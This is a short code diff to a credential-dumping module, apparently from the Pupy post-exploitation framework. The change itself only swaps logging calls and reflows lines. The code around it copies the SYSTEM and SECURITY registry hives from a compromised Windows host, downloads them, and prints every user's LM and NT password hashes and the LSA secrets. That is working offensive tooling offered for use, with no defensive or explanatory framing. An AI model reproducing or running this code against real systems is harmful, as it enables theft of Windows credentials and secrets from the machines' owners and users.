@@ -58,7 +58,7 @@ class CredDump(PupyModule):
         self.success("hives saved!")            
         remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
         
-        self.success("downloading SYSTEM hive...")
+        self.info("downloading SYSTEM hive...")
         download(self.client.conn, ntpath.join(remote_temp, "SYSTEM"), os.path.join(rep, "SYSTEM"))
         
         self.info("downloading SECURITY hive...")
@@ -111,18 +111,16 @@ class CredDump(PupyModule):
             lmhash, nthash = get_user_hashes(user,hbootkey)
             if not lmhash: lmhash = empty_lm
             if not nthash: nthash = empty_nt
-            self.success ("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16),
-                lmhash.encode('hex'), nthash.encode('hex')))
+            self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
         
         self.success("dumping lsa secrets...")
-        secrets = get_file_secrets(os.path.join(rep, "SYSTEM"),
-            os.path.join(rep, "SECURITY"), is_vista)
+        secrets = get_file_secrets(os.path.join(rep, "SYSTEM"), os.path.join(rep, "SECURITY"), is_vista)
         if not secrets:
             self.error("unable to read LSA secrets, perhaps the hives are corrupted")
             return
         for key in secrets:
-            self.success(key)
-            self.success(self.dump(secrets[key], length=16))
+            self.log(key)
+            self.log(self.dump(secrets[key], length=16))
         
         # The End! (hurrah)
         self.success("dump was successfull!")
